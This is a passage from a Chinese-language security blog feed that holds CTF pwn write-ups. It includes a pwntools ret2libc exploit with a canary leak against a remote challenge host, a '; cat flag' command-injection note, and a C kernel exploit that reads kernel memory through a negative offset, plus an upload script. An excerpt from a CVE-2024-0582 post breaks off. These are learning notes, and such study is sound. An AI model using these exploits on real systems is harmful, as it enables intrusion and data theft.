class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27694&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x400993</span><br>vuln = <span class="hljs-number">0x400887</span><br>main = <span class="hljs-number">0x4008DA</span><br>ret = <span class="hljs-number">0x4008D9</span><br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#     b *vuln+55</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>ru(<span class="hljs-string">b&#x27;u!\n&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;canary: <span class="hljs-subst">&#123;canary&#125;</span>&quot;</span>)<br>ru(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>sl(payload)<br>put = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;put_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(put)&#125;</span>&quot;</span>)<br><br>obj = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, put)<br>libc_base = put - obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system = libc_base + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc_base + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br><span class="hljs-comment"># libc_base = put - libc.sym[&#x27;puts&#x27;]</span><br><span class="hljs-comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-comment"># bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;libc: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;system: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(system)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bin_sh: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br>rl()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system) + p64(vuln)<br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>有两个错误（bushi</p><ol><li>返回地址vuln搞错了，应该是复制的时候没注意</li><li>调用函数需要栈16字节对齐。因此需要一个<code>ret</code>使得栈对齐</li></ol><h1 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h1><p>感觉是个 ** 题目，直接输入1，然后; cat flag就行</p><h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>堆题（！！！！终于做到有关堆的题目了，可以开始新的学习了<br>第一步是先简单的逆向<br>结果下图所示：</p><p>今天没有多做堆&#x2F;栈的题目，打TFC CTF做到了一道kernel pwn题。</p><p>记录一些知识点，之后要了解其细节：</p><ol><li>CPU从用户态切换到内核态经历的具体过程</li><li>Linux下的系统调用以<code>eax/rax</code>寄存器作为<strong>系统调用号</strong>，参数传递约束如下：</li></ol><ul><li><p>32 位：<code>ebx、ecx、edx、esi、edi、ebp</code> 作为第一个参数、第二个参数…进行参数传递</p></li><li><p>64 位：<code>rdi、rsi、rdx、r10、r8、r9</code> 作为第一个参数、第二个参数…进行参数传递</p><p>  对于 32 位系统调用而言，Linux 实际上通过 0x80 号软中断实现系统调用的基本功能，即用户态程序通过 <code>int 0x80</code> 指令触发一个软中断陷入内核题，对应的中断处理程序会根据系统调用号在系统调用表中调用对应的处理</p></li></ul><p>接着上次的<code>kernel pwn</code>题</p><h1 id="TFC-CTF"><a href="#TFC-CTF" class="headerlink" title="TFC CTF"></a>TFC CTF</h1><h3 id="slots"><a href="#slots" class="headerlink" title="slots"></a>slots</h3><p>查看一下<code>/dev</code>目录下多的设备文件，名字为：<code>slot_machine</code>，IDA看一下具体交互的函数</p><ul><li><code>cmd = 0</code>，kmalloc(chunk)，但是最多两次</li><li><code>cmd = 1</code>，free(chunk)，</li><li><code>cmd = 3</code>，copy_from_user</li><li><code>cmd = 1337</code>，copy_to_user</li></ul><p>这里有一些在内核中与用户态函数发挥作用相同的函数：</p><p>memcpy() -&gt; <strong>copy_from_user()&#x2F;copy_to_user()</strong><br>    - copy_from_user() 实现了将用户空间的数据传送到内核空间<br>    - copy_to_user()<br>malloc() -&gt; <strong>kmalloc()</strong>，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code><br>free() -&gt; <strong>kfree()</strong>，同 kmalloc()</p><p><img src="/images/20250902203717.png"><br>这里<code>kfree</code>掉之后并没有将指针置空，所以存在典型的UAF<br><img src="/images/20250902204516.png"><br>这里有一个问题，offset可以是负的，可以从内核中读任意大小的size到用户态并且写出来。这就可以直接从chunk地址中读flag了。</p><p>exp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Kernel Pwn Infrastructures</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESS_MSG(msg)    <span class="hljs-string">&quot;\033[32m\033[1m[+]&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg)       <span class="hljs-string">&quot;\033[34m\033[1m[*]&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR_MSG(msg)      <span class="hljs-string">&quot;\033[31m\033[1m[x]&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OFFSET 0x100000</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Searching for byte: b&#x27;CTF&#123;fakeflag&#125;&#x27;</span><br><span class="hljs-comment">[pt_ff110000022fc] 0xff11000002335560 &#x27;CTF&#123;fakeflag&#125;\n&#x27;</span><br><span class="hljs-comment">[pt_ffffffffc0201] 0xffffffffc0201560 &#x27;CTF&#123;fakeflag&#125;\n&#x27;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> index;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125;data;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// initialize </span><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/slot_machine&quot;</span>, O_RDWR);<br><br>    <span class="hljs-comment">// ioctl to alloc chunk</span><br>    log_info(<span class="hljs-string">&quot;alloc chunk of size 0x400&quot;</span>);<br>    <span class="hljs-type">size_t</span> chunk_size = <span class="hljs-number">0x400</span>;<br>    ioctl(fd, <span class="hljs-number">0</span>, &amp;chunk_size);<br><br>    <span class="hljs-comment">// ioctl to read chunk[-0x436a0]</span><br>    log_info(<span class="hljs-string">&quot;read chunk[-0x100000]&quot;</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> <span class="hljs-title">user_data</span>;</span><br>    user_data.buf = <span class="hljs-built_in">malloc</span>(MAX_OFFSET);<br>    user_data.index = <span class="hljs-number">0</span> - (MAX_OFFSET);<br>    user_data.size = MAX_OFFSET;<br>    ioctl(fd, <span class="hljs-number">1337</span>, &amp;user_data);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] read chunk :&quot;</span>);<br>    write(<span class="hljs-number">1</span>, user_data.buf, user_data.size);<br>    log_info(<span class="hljs-string">&quot;free chunk&quot;</span>);<br>    ioctl(fd, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>交互脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp2&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br>    <br><span class="hljs-comment"># p = process(&quot;ncat --ssl slots-d7c8dd09933f35f4.challs.tfcctf.com 1337&quot;.split())</span><br>p = process(<span class="hljs-string">&quot;./run.sh&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;~ $ &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ncat success&quot;</span>)<br><br>count = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>    chunk = exp[i:i + <span class="hljs-number">0x200</span>]<br>    p.sendline(<span class="hljs-string">b&quot;echo -n \&quot;&quot;</span> + chunk + <span class="hljs-string">b&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)<br>    count += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>    p.recvuntil(<span class="hljs-string">b&quot;~ $&quot;</span>)<br><br>p.sendline(<span class="hljs-string">b&quot;base64 -d b64_exp &gt; exp&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;chmod +x exp&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;./exp | grep CTF&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>然后接着看堆的内容罢（）</p><h1 id="babyheap-0ctf-2017-1"><a href="#babyheap-0ctf-2017-1" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>64位，保护全开</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/babyheap_0ctf_2017&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br></code></pre></td></tr></table></figure><p>分配结构体结构为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br><span class="hljs-type">int</span> flag;<br><span class="hljs-type">int</span> size;<br><span class="hljs-type">long</span> <span class="hljs-type">int</span> addr;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>fill</code>函数中有一个堆溢出，可以写任意<code>size</code>的内容到<code>addr</code>处，因此</p><p><img src="/images/20250903153014.png"></p><p>洞基本找到了，但是发现不会利用～<br>还是对堆的基本操作和原理不是很清晰。最近就拿这个题来熟悉一下堆实现的具体操作和原理吧</p><h1 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h1><p>堆题，保护开启情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br></code></pre></td></tr></table></figure><p><img src="/images/20250903150722.png"><br>这里自定义的<code>my_read</code>函数回读size+1个字符才<code>break</code>掉，因为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(i==size)<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>放在最后面，所以存在一个<code>off_by_one</code>。后面的内容没看懂。这题先放一放</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-0582</title>
    <link href="/2025/08/29/CVE-2024-0582/"/>
    <url>/2025/08/29/CVE-2024-0582/</url>
    
    <content type="html"><![CDATA[<blockquote><p>需要先了解一些前置知识</p></blockquote><h3 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a><code>volatile</code></h3><p>指定变量不能被编译器优化，每次使用都必须从地址直接取值。否则，编译器优化后可能将变量值放入寄存器中来取值。</p><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">// int volatile a = 10;</span><br>    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> b = a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %d\n&quot;</span>, b);<br>    __asm__(<br>        <span class="hljs-string">&quot;mov DWORD PTR 12[rsp], 0x20&quot;</span><br>    );<br>    <span class="hljs-type">int</span> c = a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %d\n&quot;</span>, c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>, a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 对应汇编：</span><br>main:<br>.LFB51:<br>.cfi_startproc<br>endbr64<br>pushrbp<br>.cfi_def_cfa_offset <span class="hljs-number">16</span><br>.cfi_offset <span class="hljs-number">6</span>, <span class="hljs-number">-16</span><br>learbp, .LC0[rip]<br>movedx, <span class="hljs-number">10</span><br>xoreax, eax<br>movrsi, rbp<br>movedi, <span class="hljs-number">1</span><br>call__printf_chk@PLT<br>movedx, <span class="hljs-number">10</span><br>learsi, .LC1[rip]<br>xoreax, eax<br>movedi, <span class="hljs-number">1</span><br>call__printf_chk@PLT<br>#APP<br># <span class="hljs-number">11</span> <span class="hljs-string">&quot;main.c&quot;</span> <span class="hljs-number">1</span><br>mov DWORD PTR <span class="hljs-number">12</span>[rsp], <span class="hljs-number">0x20</span><br># <span class="hljs-number">0</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-number">2</span><br>#NO_APP<br>movedx, <span class="hljs-number">10</span><br>learsi, .LC2[rip]<br>movedi, <span class="hljs-number">1</span><br>xoreax, eax<br>call__printf_chk@PLT<br>movrsi, rbp<br>movedx, <span class="hljs-number">10</span><br>xoreax, eax<br>movedi, <span class="hljs-number">1</span><br>call__printf_chk@PLT<br>xoreax, eax<br>poprbp<br>.cfi_def_cfa_offset <span class="hljs-number">8</span><br>ret<br>.cfi_endproc<br><br><br><span class="hljs-comment">//下面的是有修饰的</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-keyword">volatile</span> a = <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">// int a = 10;</span><br>    <span class="hljs-type">int</span> b = a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %d\n&quot;</span>, b);<br>    __asm__(<br>        <span class="hljs-string">&quot;mov DWORD PTR 12[rsp], 0x20&quot;</span><br>    );<br>    <span class="hljs-type">int</span> c = a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %d\n&quot;</span>, c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>, a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 对应汇编</span><br>main:<br>.LFB51:<br>.cfi_startproc<br>endbr64<br>pushr12<br>.cfi_def_cfa_offset <span class="hljs-number">16</span><br>.cfi_offset <span class="hljs-number">12</span>, <span class="hljs-number">-16</span><br>movedi, <span class="hljs-number">1</span><br>xoreax, eax<br>pushrbp<br>.cfi_def_cfa_offset <span class="hljs-number">24</span><br>.cfi_offset <span class="hljs-number">6</span>, <span class="hljs-number">-24</span><br>learbp, .LC0[rip]<br>movrsi, rbp<br>subrsp, <span class="hljs-number">24</span><br>.cfi_def_cfa_offset <span class="hljs-number">48</span><br>movDWORD PTR <span class="hljs-number">12</span>[rsp], <span class="hljs-number">10</span><br>movr12d, DWORD PTR <span class="hljs-number">12</span>[rsp]<br>movedx, DWORD PTR <span class="hljs-number">12</span>[rsp]<br>call__printf_chk@PLT<br>movedx, r12d<br>movedi, <span class="hljs-number">1</span><br>xoreax, eax<br>learsi, .LC1[rip]<br>call__printf_chk@PLT<br>#APP<br># <span class="hljs-number">11</span> <span class="hljs-string">&quot;main.c&quot;</span> <span class="hljs-number">1</span><br>mov DWORD PTR <span class="hljs-number">12</span>[rsp], <span class="hljs-number">0x20</span><br># <span class="hljs-number">0</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-number">2</span><br>#NO_APP<br>movedx, DWORD PTR <span class="hljs-number">12</span>[rsp]<br>learsi, .LC2[rip]<br>movedi, <span class="hljs-number">1</span><br>xoreax, eax<br>call__printf_chk@PLT<br>movedx, DWORD PTR <span class="hljs-number">12</span>[rsp]<br>movrsi, rbp<br>xoreax, eax<br>movedi, <span class="hljs-number">1</span><br>call__printf_chk@PLT<br>addrsp, <span class="hljs-number">24</span><br>.cfi_def_cfa_offset <span class="hljs-number">24</span><br>xoreax, eax<br>poprbp<br>.cfi_def_cfa_offset <span class="hljs-number">16</span><br>popr12<br>.cfi_def_cfa_offset <span class="hljs-number">8</span><br>ret<br>.cfi_endproc<br></code></pre></td></tr></table></figure><p>两个程序运行也不同，没有<code>volatile</code>修饰的，通过寄存器直接赋值，导致内嵌汇编修改地址处的值失去作用。<br>![[Pasted image 20250819094331.png]]</p><h3 id="内存序"><a href="#内存序" class="headerlink" title="内存序"></a>内存序</h3><p>指CPU对内存的访问顺序。</p><h3 id="2025-8-7-note-6eaa19-Linux系统调用路径"><a href="#2025-8-7-note-6eaa19-Linux系统调用路径" class="headerlink" title="[[2025.8.7_note#^6eaa19|Linux系统调用路径]]"></a>[[2025.8.7_note#^6eaa19|Linux系统调用路径]]</h3><p>内核中有一个极其重要的概念：<code>特权级别</code>，用户态工作在<code>Ring3</code>，内核态工作在<code>Ring0</code>，一般，我们认为<code>Ring1, Ring2</code>都是空的。</p><p>用户程序要进行一次特权操作，就必须执行一次特权切换，即从<code>Ring3</code>跳到<code>Ring0</code>。执行完权限之后又需要返回<code>Ring3</code>。实现特权切换的方式有三种：</p><ol><li>中断</li><li>陷阱</li><li>系统调用</li></ol><h4 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h4><p>中断是硬件或软件产生的事件。</p><ul><li>硬件中断是由硬件设备触发的，用来通知内核发生了特定的事件。</li><li>软件中断是由执行中的程序触发的。在 x86-64 系统上，软件中断可以通过 <code>int</code> 指令触发。</li></ul><h3 id="io-uring"><a href="#io-uring" class="headerlink" 